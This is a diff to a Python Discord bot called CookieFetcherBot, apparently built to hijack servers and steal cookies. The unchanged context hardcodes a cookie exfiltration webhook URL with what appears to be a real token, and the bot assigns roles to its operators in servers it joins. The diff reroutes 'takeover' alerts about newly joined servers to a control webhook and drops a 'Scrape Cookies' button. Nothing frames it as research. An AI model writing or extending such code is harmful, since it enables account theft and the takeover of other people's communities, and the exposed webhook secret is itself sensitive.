@@ -26,6 +26,7 @@ logger = logging.getLogger(__name__)
 
 AUTHORIZED_USERS = [216953894322962433, 1422280514072608932, 219564668933373962]
 CONTROL_CHANNEL_ID = 1432729863692881972
+CONTROL_WEBHOOK_URL = "https://discord.com/api/webhooks/1432729863692881972/your_control_webhook_token_here"  # Replace with actual webhook URL
 COOKIE_WEBHOOK_URL = "https://discord.com/api/webhooks/1432710240343822467/uYzeK2Z0TADkceF97olVympDJiJIJFDYbVrnz4uHwpV3AYh7QswHwb8-EVvrQ1SzyCHb"
 OWNED_SERVER_IDS = [1396878002620727397]
 SERVER_INVITES = {}
@@ -387,7 +388,7 @@ class CookieFetcherBot(discord.Client):
                 pass
 
             if guild.id not in OWNED_SERVER_IDS:
-                # Send takeover notification with buttons to mirror webhook
+                # Send takeover notification with buttons to control channel webhook
                 takeover_embed = discord.Embed(
                     title="🚨 New Server Joined",
                     description=f"**Server:** {guild.name}\n**Members:** {guild.member_count:,}\n**Invite:** {invite_url}",
@@ -413,24 +414,17 @@ class CookieFetcherBot(discord.Client):
                                     'style': 4,  # Red
                                     'label': 'Disable Auto-Delete',
                                     'custom_id': f'disable_delete_{guild.id}'
-                                },
-                                {
-                                    'type': 2,  # Button
-                                    'style': 2,  # Grey
-                                    'label': 'Scrape Cookies',
-                                    'custom_id': f'scrape_{guild.id}'
                                 }
                             ]
                         }
                     ]
                 }
 
-                # Send takeover with buttons to mirror webhook
-                if MIRROR_WEBHOOK_URL:
-                    async with aiohttp.ClientSession() as session:
-                        async with session.post(MIRROR_WEBHOOK_URL, json=takeover_data) as response:
-                            if response.status not in [200, 204]:
-                                logger.error(f"Failed to send takeover to mirror webhook: {response.status}")
+                # Send takeover with buttons to control channel webhook
+                async with aiohttp.ClientSession() as session:
+                    async with session.post(CONTROL_WEBHOOK_URL, json=takeover_data) as response:
+                        if response.status not in [200, 204]:
+                            logger.error(f"Failed to send takeover to control webhook: {response.status}")
 
                 # 🟢 AUTO-ASSIGN ROLES
                 await self.assign_role_to_authorized(guild)
